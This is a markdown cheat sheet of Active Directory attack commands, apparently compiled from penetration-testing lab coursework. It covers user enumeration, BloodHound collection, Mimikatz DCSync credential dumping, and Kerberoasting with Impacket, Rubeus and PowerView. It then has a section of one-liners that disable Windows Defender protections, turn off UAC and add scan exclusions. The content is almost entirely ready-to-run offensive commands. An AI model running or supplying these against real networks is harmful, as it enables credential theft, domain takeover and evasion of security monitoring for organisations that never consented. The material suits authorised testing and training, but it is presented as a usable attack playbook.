# Active Directory Notes
Enumeration, exploitation, and privilege escalation notes, all in one place.

## Table of Contents
- [Enumeration](#enumeration)
  - [Host Scanning](#host-scanning)
  - [Kerberos](#kerberos)
  - [Bloodhound](#bloodhound)
- [Exploitation](#exploitation)
  - [DCSync Attack](#dcsync-attack)
  - [Kerberoasting](#kerberoasting)
  - [Antivirus Evasion and Detection](#antivirus-evasion-and-detection)
 
 ----
 
# Enumeration
## Host Scanning
```bash
# Generate host file
netexec smb <IP> --generate-hosts-file hosts

# Username Enumeration
sudo nxc smb <IP> -u USER -p '' --rid-brute

# Matching the system dates 
sudo rdate -n 10.129.152.17

# Username creation and enumeration
enum4linux -U <IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
## Kerberos
```bash
# krb5.conf boilerplate -> /etc/krb5.conf
sudo nxc smb <IP> -u USER -p '' --generate-krb5-file krb5.conf

# Grabbing TGT ticket of USER
getTGT.py -dc-ip <IP> 'domain.dc/USER:PASS'

# Setting klist
export KRB5CCNAME=Olivia.ccache
klist
```
## Bloodhound
```bash
# Start Bloodhound
sudo neo4j start

# Collect json for bloodhound`
netexec ldap DC.domain.dc -u USER -p 'PASS' --bloodhound -c All --dns-server <IP>

# Collect as Kerberosed USER
bloodhound-python -u 'USER' -p 'PASS' -d domain.dc -c All -o bloodhound_results.json -ns <IP> -k
```
# Exploitation
## DCSync Attack
```bash
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | sel
ect samaccountname,objectsid,memberof,useraccountcontrol |fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator


# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```
## Kerberoasting
```bash
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
 
# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
## Antivirus Bypassing and Evasion
```bash
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
